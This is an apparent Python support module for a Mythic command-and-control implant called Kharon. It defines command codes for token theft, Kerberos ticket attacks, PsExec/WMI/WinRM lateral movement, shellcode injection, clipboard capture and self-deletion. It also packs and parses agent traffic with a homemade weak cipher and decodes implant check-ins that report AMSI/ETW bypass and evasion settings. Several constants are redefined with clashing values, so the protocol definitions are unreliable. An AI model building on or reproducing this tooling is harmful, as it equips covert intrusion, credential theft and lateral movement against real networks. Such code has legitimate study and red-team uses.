import base64
import os
import json
import re
import base64
import struct
import ast
import logging
from struct import pack, calcsize

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

KH_CALLBACK_OUTPUT     = 0x0
KH_CALLBACK_ERROR      = 0x0d
KH_CALLBACK_NO_PRE_MSG = 0x4f

SB_CFG_JITTER   = 14;
SB_CFG_SLEEP    = 15;
SB_CFG_MASK     = 16;
SB_CFG_SC       = 17;
SB_CFG_PE       = 18;
SB_CFG_PPID     = 19;
SB_CFG_BLOCK    = 20;
SB_CFG_CURDIR   = 21;
SB_CFG_ARG      = 22;
SB_CFG_KILLDATE = 23;
SB_CFG_WORKTIME = 24;

mask_id = {
    "timer": 1,
    "none": 3
}

shellcode_id = {
    "classic": 0,
    "stomp": 1
}

pe_id = {
    "reflection": 0
}

config_id = {
    "jitter": SB_CFG_JITTER,
    "sleep":  SB_CFG_SLEEP,
    "mask":   SB_CFG_MASK,
    "injection-sc": SB_CFG_SC,
    "injection-pe":  SB_CFG_PE,
    "ppid":   SB_CFG_PPID,
    "block":  SB_CFG_BLOCK,
    "curdir": SB_CFG_CURDIR,
    "arg": SB_CFG_ARG,
    "killdate": SB_CFG_KILLDATE,
    "worktime": SB_CFG_WORKTIME
}

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_CD    = 33;
SB_FS_MV    = 34;
SB_FS_CP    = 35;
SB_FS_DEL   = 36;
SB_FS_MKDIR = 37;

SB_PS_LIST   = 20;
SB_PS_CREATE = 21;
SB_PS_KILL   = 22;

KH_CALLBACK_OUTPUT = 0x0
KH_CALLBACK_ERROR  = 0x0d

JOB_CHECKIN   = 0xf1;
JOB_GET_TASK  = 0;
JOB_POST      = 1;
JOB_NO_JOB    = 4;
JOB_QUICK_MSG = 5;
JOB_ERROR     = 6;
JOB_QUICK_OUT = 7;

BF_WHOAMI     = 5000;
BF_IPCONFIG   = 5001;
BF_CLIPDUMP   = 5002;
BF_SELFDEL    = 5003;
BF_SCREENSHOT = 5004;

BF_JMP_PSEXEC = 5051;
BF_JMP_WMI    = 5052;
BF_JMP_WINRM  = 5053;

BF_KRB_ASREP  = 5101;
BF_KRB_ASKTGT = 5102;
BF_KRB_ASKTGS = 5103;
BF_KRB_DUMP   = 5104;
BF_KRB_CHNGPW = 5105;
BF_KRB_KRBRST = 5106;
BF_KRB_KLIST  = 5107;
BF_KRB_PTT    = 5108;
BF_KRB_PURGE  = 5109;
BF_KRB_S4U    = 5110;
BF_KRB_RENEW  = 5111;
BF_KRB_TGTDEL = 5112;
BF_KRB_TRIAGE = 5113;
BF_KRB_DESCB  = 5114;
BF_KRB_HASH   = 5115;

SB_INJ_SC   = 30;
SB_INJ_PE   = 31;

T_CONFIG    = 10;
T_PROCESS   = 11;
T_FILESYS   = 12;
T_UPLOAD    = 13;
T_DOWNLOAD  = 14;
T_INFO      = 15;
T_SELFDEL   = 16;
T_EXIT      = 17;
T_SOCKS     = 18;
T_EXEC_BOF  = 19;
T_TOKEN     = 20;
T_PIVOT     = 21;
T_POSTEX    = 22;
T_SC_INJECT = 23;

SB_TOKEN_GETUUID = 10;
SB_TOKEN_STEAL   = 11;
SB_TOKEN_MAKE    = 12;
SB_TOKEN_GETPRIV = 13;
SB_TOKEN_LISTPRIV= 14;
SB_TOKEN_REV2SELF= 15;
SB_TOKEN_USE     = 16;
SB_TOKEN_RM      = 17;

SB_POSTEX_INLINE = 0;
SB_POSTEX_FORK   = 1;

SB_FORK_INIT = 0;
SB_FORK_GET  = 1;

SB_INLINE_INIT = 0;
SB_INLINE_GET  = 1;

SB_PIVOT_LINK   = 10;
SB_PIVOT_UNLINK = 11;
SB_PIVOT_LIST   = 12;

SB_DT_INLINE = 5;
SB_DT_UNLOAD = 6;
SB_DT_LIST   = 7;
SB_DT_INVOKE = 8;
SB_DT_SPAWN  = 9;

SB_CFG_SLEEP  = 15;
SB_CFG_MASK   = 16;
SB_CFG_SC     = 17;
SB_CFG_PE     = 18;
SB_CFG_PPID   = 19;
SB_CFG_BLOCK  = 20;
SB_CFG_CURDIR = 20;

SB_EXIT_T   = 20;
SB_EXIT_P   = 21;

SB_PS_LIST   = 20;
SB_PS_CREATE = 21;
SB_PS_KILL   = 22;

SB_FS_LS    = 30;
SB_FS_CAT   = 31;
SB_FS_PWD   = 32;
SB_FS_MV    = 33;
SB_FS_CP    = 34;
SB_FS_MKDIR = 35;
SB_FS_DEL   = 36;
SB_FS_CD    = 37;

Jobs = {
    "checkin":       {"hex_code": JOB_CHECKIN },
    "get_tasking":   {"hex_code": JOB_GET_TASK },
    "post_response": {"hex_code": JOB_POST },
    "error":         {"hex_code": JOB_ERROR },
    "quick_msg":     {"hex_code": JOB_QUICK_MSG},
    "quick_out":     {"hex_code": JOB_QUICK_OUT}
}

Jobs = {
    "checkin":       {"hex_code": JOB_CHECKIN },
    "get_tasking":   {"hex_code": JOB_GET_TASK },
    "post_response": {"hex_code": JOB_POST },
    "error":         {"hex_code": JOB_ERROR },
    "quick_msg":     {"hex_code": JOB_QUICK_MSG},
    "quick_out":     {"hex_code": JOB_QUICK_OUT}
}

Commands = {
    # Task commands
    "info":      {"hex_code": T_INFO},
    "socks":     {"hex_code": T_SOCKS},
    "self-del":  {"hex_code": T_SELFDEL},
    "upload":    {"hex_code": T_UPLOAD},
    "download":  {"hex_code": T_DOWNLOAD},
    "exec-bof":  {"hex_code": T_EXEC_BOF},

    "token": {
        "hex_code": T_TOKEN,
        "subcommands": {
            "getuuid"  : {"sub": SB_TOKEN_GETUUID},
            "make"     : {"sub": SB_TOKEN_MAKE},
            "steal"    : {"sub": SB_TOKEN_STEAL},
            "getprivs" : {"sub": SB_TOKEN_GETPRIV},
            "listprivs": {"sub": SB_TOKEN_LISTPRIV},
            "use"      : {"sub": SB_TOKEN_USE},
            "rm"       : {"sub": SB_TOKEN_RM},
            "rev2self" : {"sub": SB_TOKEN_REV2SELF},
        }
    },

    "bof": {
        "whoami":     {"sub": BF_WHOAMI},
        "ipconfig":   {"sub": BF_IPCONFIG},
        "clipdump":   {"sub": BF_CLIPDUMP},
        "selfdel":    {"sub": BF_SELFDEL},
        "screenshot": {"sub": BF_SCREENSHOT},

        "psexec":     {"sub": BF_JMP_PSEXEC},
        "wmi":        {"sub": BF_JMP_WMI},
        "winrm":      {"sub": BF_JMP_WINRM},

        "krb-asrep":  {"sub": BF_KRB_ASREP},
        "krb-asktgt": {"sub": BF_KRB_ASKTGT},
        "krb-asktgs": {"sub": BF_KRB_ASKTGS},
        "krb-dump":   {"sub": BF_KRB_DUMP},
        "krb-chngpw": {"sub": BF_KRB_CHNGPW},
        "krb-krbrst": {"sub": BF_KRB_KRBRST},
        "krb-klist":  {"sub": BF_KRB_KLIST},
        "krb-ptt":    {"sub": BF_KRB_PTT},
        "krb-purge":  {"sub": BF_KRB_PURGE},
        "krb-s4u":    {"sub": BF_KRB_S4U},
        "krb-renew":  {"sub": BF_KRB_RENEW},
        "krb-tgtdel": {"sub": BF_KRB_TGTDEL},
        "krb-triage": {"sub": BF_KRB_TRIAGE},
        "krb-descb":  {"sub": BF_KRB_DESCB},
        "krb-hash":   {"sub": BF_KRB_HASH}
    },

    # Exit method
    "exit": {
        "hex_code": T_EXIT,
        "subcommands": {
            "process": {"sub": SB_EXIT_P},
            "thread" : {"sub": SB_EXIT_T}
        }
    },
    
    # Filesystem command with subcommands
    "fs": {
        "hex_code": T_FILESYS,
        "subcommands": {
            "ls":    {"sub": SB_FS_LS},
            "cat":   {"sub": SB_FS_CAT},
            "pwd":   {"sub": SB_FS_PWD},
            "cd":    {"sub": SB_FS_CD},
            "mv":    {"sub": SB_FS_MV},
            "cp":    {"sub": SB_FS_CP},
            "rm":    {"sub": SB_FS_DEL},
            "mkdir": {"sub": SB_FS_MKDIR}
        }
    },
    
    # Configuration command with subcommands
    "config": {
        "hex_code": T_CONFIG,
    },
    
    # Process command with subcommands
    "proc": {
        "hex_code": T_PROCESS,
        "subcommands": {
            "run" : {"sub": SB_PS_CREATE},
            "list": {"sub": SB_PS_LIST},
            "cmd" : {"sub": SB_PS_CREATE},
            "pwsh": {"sub": SB_PS_CREATE},
            "kill": {"sub": SB_PS_KILL}
        }
    },

    "pivot": {
        "hex_code": T_PIVOT,
        "subcommands": {
            "link"  : {"sub" : SB_PIVOT_LINK},
            "unlink": {"sub" : SB_PIVOT_UNLINK},
            "list"  : {"sub" : SB_PIVOT_LIST},
        }
    },

    "exec-sc": {
        "hex_code": T_SC_INJECT
    },

    "post_ex": {
        "hex_code": T_POSTEX,
        "subcommands": {
            "inline": {
                    "sub": SB_POSTEX_INLINE, 
                    "step_init": SB_INLINE_INIT, 
                    "step_get": SB_INLINE_GET
                },
            "fork"  : {
                "sub": SB_POSTEX_FORK, 
                "step_init": SB_FORK_INIT,   
                "step_get": SB_FORK_GET
            },
        }
    }
};

class Packer:
    buffer: bytes = b'';
    length: int   = 0;

    def GetBuff( self ) -> bytes:
        return pack( "<L", self.length ) + self.buffer;

    def Int8( self, data ) -> None:
        self.buffer += pack( "<b", data );
        self.length += 1;
    
        return;

    def Int16( self, data:int ) -> None:
        self.buffer += pack( "<h", data );
        self.length += 2;
    
        return;

    def Int32( self, data:int ) -> None:

        self.buffer += pack( "<i", data );
        self.length += 4;

        return;

    def Int64( self, data ) -> None:

        self.buffer += pack( "<q", data );
        self.length += 8;

        return;

    def Pad( self, data:bytes ) -> None:
        self.buffer += pack("<L", len(data)) + data
        self.length += 4 + len(data)
        return
    
    def Bytes( self, data: bytes ) -> None:

        fmt = "<L{}s".format( len( data ) + 1 );

        self.buffer += pack( fmt, len( data ) + 1, data );
        self.length += calcsize( fmt );
    
    def Char( self, data:bytes ) -> None:
        if data is None:
            data = ''
        if isinstance(data, str):
            data = data.encode("utf-8" )
        fmt = "<L{}s".format(len(data) + 1)
        self.buffer += pack(fmt, len(data)+1, data)
        self.length += calcsize(fmt)
    
    def Wchar( self, data:bytes ) -> None:
        if data is None:
            data = ''
        data = data.encode("utf-16_le")
        fmt = "<L{}s".format(len(data) + 2)
        self.buffer += pack(fmt, len(data)+2, data)
        self.length += calcsize(fmt)

    def Clean( self ) -> None:
        self.buffer = b'';
        self.length = 0;
    
        return;

    def Dmp( self ) -> None:

        print( f"[*] Buffer: [{ self.length }] [{ self.GetBuff() }]" );

        return;

class Parser:
    buffer: bytes = b'';
    length: int   = 0;

    def __init__( self, buffer, length ):

        self.buffer = buffer;
        self.length = length;

        return;

    def Int16( self ):

        val = struct.unpack( ">h", self.buffer[ :2 ] );
        self.buffer = self.buffer[ 2: ];

        return val[ 0 ];

    def Int32( self ) -> int:

        val = struct.unpack( ">i", self.buffer[ :4 ] );
        self.buffer = self.buffer[ 4: ];

        return val[ 0 ];

    def Int64( self ):

        val = struct.unpack( ">q", self.buffer[ :8 ] );
        self.buffer = self.buffer[ 8: ];

        return val[ 0 ];

    def Bytes( self ) -> bytes:

        length      = self.Int32();

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Pad( self, length: int ) -> bytes:

        buf         = self.buffer[ :length ];
        self.buffer = self.buffer[ length: ];

        return buf;

    def Str( self ) -> str:
        return self.Bytes().decode( 'utf-8', errors="replace" );
    
    def Wstr( self ):
        return self.Bytes().decode( 'utf-16' );

    def All( self ) -> bytes:
        remaining = self.buffer
        self.buffer = b''
        return remaining

def is_valid_base64(s: str) -> bool:
    if len(s) % 4 != 0:
        return False
    try:
        base64.b64decode(s, validate=True)
        return True
    except:
        return False

def Dbg1( Input:str ) -> None:
    ConcStr = f"CHECKIN => {Input}";
    logging.info(ConcStr)

def Dbg2( Input:str ) -> None:
    ConcStr = f"POST => {Input}";
    logging.info(ConcStr)

def Dbg3( Input:str ) -> None:
    ConcStr = f"TASK => {Input}";
    logging.info(ConcStr)

def Dbg4( Input:str ) -> None:
    ConcStr = f"CHECKIN => {Input}";
    logging.info(ConcStr)

def Dbg5( Input:str ) -> None:
    ConcStr = f"TASK => {Input}";
    logging.info(ConcStr)

def Dbg6( Input:str ) -> None:
    ConcStr = f"POST => {Input}";
    logging.info(ConcStr)

def Dbg7( Input:str ) -> None:
    ConcStr = f"FMT => {Input}";
    logging.info(ConcStr)

def Dbg8( Input:str ) -> None:
    ConcStr = f"FMT => {Input}";
    logging.info(ConcStr)

class LokyCrypt:
    def __init__(self, key):
        self.BLOCK_SIZE = 8
        self.NUM_ROUNDS = 16
        
        if isinstance(key, str):
            key = key.encode('utf-8')
        self.key = [b for b in key]  # Lista de inteiros (0-255)
        
        # Garantir que a chave tem 16 bytes como no C
        if len(self.key) < 16:
            self.key += [0] * (16 - len(self.key))
        elif len(self.key) > 16:
            self.key = self.key[:16]

    def _cycle(self, block, mode):
        # Exatamente igual à implementação C
        left = (block[0] << 24) | (block[1] << 16) | (block[2] << 8) | block[3]
        right = (block[4] << 24) | (block[5] << 16) | (block[6] << 8) | block[7]
        
        if mode == 'encrypt':
            for round in range(self.NUM_ROUNDS):
                temp = right
                right = left ^ (right + self.key[round % len(self.key)])
                left = temp
        else:  # decrypt
            for round in reversed(range(self.NUM_ROUNDS)):
                temp = left
                left = right ^ (left + self.key[round % len(self.key)])
                right = temp
        
        # Empacota de volta para bytes
        return bytes([
            (left >> 24) & 0xFF, (left >> 16) & 0xFF, (left >> 8) & 0xFF, left & 0xFF,
            (right >> 24) & 0xFF, (right >> 16) & 0xFF, (right >> 8) & 0xFF, right & 0xFF
        ])

    def encrypt(self, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        
        # Padding PKCS7 corrigido (sempre adiciona padding)
        pad_len = self.BLOCK_SIZE - (len(plaintext) % self.BLOCK_SIZE)
        pad_len = pad_len if pad_len != 0 else self.BLOCK_SIZE  # Corrige quando é múltiplo exato
        padded = plaintext + bytes([pad_len] * pad_len)
        
        encrypted = bytearray()
        for i in range(0, len(padded), self.BLOCK_SIZE):
            block = padded[i:i+self.BLOCK_SIZE]
            encrypted += self._cycle(block, 'encrypt')
                
        return bytes(encrypted)

    def decrypt(self, ciphertext):
        decrypted = bytearray()
        for i in range(0, len(ciphertext), self.BLOCK_SIZE):
            block = ciphertext[i:i+self.BLOCK_SIZE]
            decrypted += self._cycle(block, 'decrypt')
        
        # Remove padding como no C
        if len(decrypted) == 0:
            return b''
        
        pad_len = decrypted[-1]
        if 0 < pad_len <= self.BLOCK_SIZE:
            if all(byte == pad_len for byte in decrypted[-pad_len:]):
                decrypted = decrypted[:-pad_len]
        
        return bytes(decrypted)


def StorageExtract(Data):
    """Extract and organize all agent storage data efficiently"""
    
    Psr = Parser(Data, len(Data))
    
    # Architecture detection
    OsArch = Psr.Pad(1)
    OscArc = "unknown"
    if isinstance(OsArch, bytes):
        OsArch = int.from_bytes(OsArch, byteorder='big', signed=False)
    OscArc = "x64" if OsArch == 0x64 else "x86" if OsArch == 0x86 else OscArc

    # Basic Info
    username = Psr.Str()
    hostname = Psr.Str()
    netbios = Psr.Str()
    process_id = Psr.Int32()
    image_path = Psr.Str()
    internal_ip = ["0.0.0.0"]  # Default value
    architecture = OscArc

    # Evasion
    syscall_enabled = bool(Psr.Int32())
    stack_spoof_enabled = bool(Psr.Int32())
    bof_hook_api_enabled = bool(Psr.Int32())
    bypass_dotnet = Psr.Int32()

    if bypass_dotnet == 0x100:
        bypass_dotnet = "amsi and etw"
    elif bypass_dotnet == 0x400:
        bypass_dotnet = "amsi"
    elif bypass_dotnet == 0x700:
        bypass_dotnet = "etw"
    else:
        bypass_dotnet = "none"

    # Killdate
    killdate_enabled = bool(Psr.Int32())
    exit_method = Psr.Int32()
    self_delete = bool(Psr.Int32())
    killdate_year = Psr.Int16()
    killdate_month = Psr.Int16()
    killdate_day = Psr.Int16()
    killdate_date = f"{killdate_year}-{killdate_month:02d}-{killdate_day:02d}"

    # Process Info
    command_line = Psr.Str()
    heap_address = f"0x{Psr.Int32():08X}"
    elevated = bool(Psr.Int32())
    jitter = f"{Psr.Int32()}%"
    sleep_time = f"{Psr.Int32()}ms"
    parent_id = Psr.Int32()
    process_arch = Psr.Int32()
    kharon_base = f"0x{Psr.Int64():016X}"
    kharon_len = Psr.Int32()
    thread_id = Psr.Int32()

    # Mask Info
    jmp_gadget = f"0x{Psr.Int64():016X}"
    ntcontinue_gadget = f"0x{Psr.Int64():016X}"
    technique_id = Psr.Int32()

    # Process Context
    parent = Psr.Int32()
    pipe = Psr.Int32()
    current_dir = Psr.Str()
    block_dlls = bool(Psr.Int32())

    # System Resources
    processor_name = Psr.Str()
    total_ram = f"{Psr.Int32()}MB"
    available_ram = f"{Psr.Int32()}MB"
    used_ram = f"{Psr.Int32()}MB"
    ram_usage = f"{Psr.Int32()}%"
    processor_count = Psr.Int32()

    # Encryption Key
    encrypt_key = Psr.Pad( 16 )

    # Build the JSON structure
    data = {
        "basic_info": {
            "username": username,
            "hostname": hostname,
            "netbios": netbios,
            "process_id": process_id,
            "image_path": image_path,
            "internal_ip": internal_ip,
            "architecture": architecture
        },
        "evasion": {
            "syscall_enabled": syscall_enabled,
            "stack_spoof_enabled": stack_spoof_enabled,
            "bof_hook_api_enabled": bof_hook_api_enabled,
            "bypass_dotnet": bypass_dotnet
        },
        "killdate": {
            "enabled": killdate_enabled,
            "exit_method": exit_method,
            "self_delete": self_delete,
            "date": killdate_date
        },
        "process_info": {
            "command_line": command_line,
            "heap_address": heap_address,
            "elevated": elevated,
            "jitter": jitter,
            "sleep_time": sleep_time,
            "parent_id": parent_id,
            "process_arch": process_arch,
            "kharon_base": kharon_base,
            "kharon_len": kharon_len,
            "thread_id": thread_id
        },
        "mask_info": {
            "jmp_gadget": jmp_gadget,
            "ntcontinue_gadget": ntcontinue_gadget,
            "technique_id": technique_id
        },
        "process_context": {
            "parent": parent,
            "pipe": pipe,
            "current_dir": current_dir,
            "block_dlls": block_dlls
        },
        "system_resources": {
            "processor_name": processor_name,
            "total_ram": total_ram,
            "available_ram": available_ram,
            "used_ram": used_ram,
            "ram_usage": ram_usage,
            "processor_count": processor_count
        },

        "encryption_key": encrypt_key
    }

    return data

async def write_console( TaskID, Msg ) -> None:
    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
        TaskID=TaskID,
        Response=Msg
    ))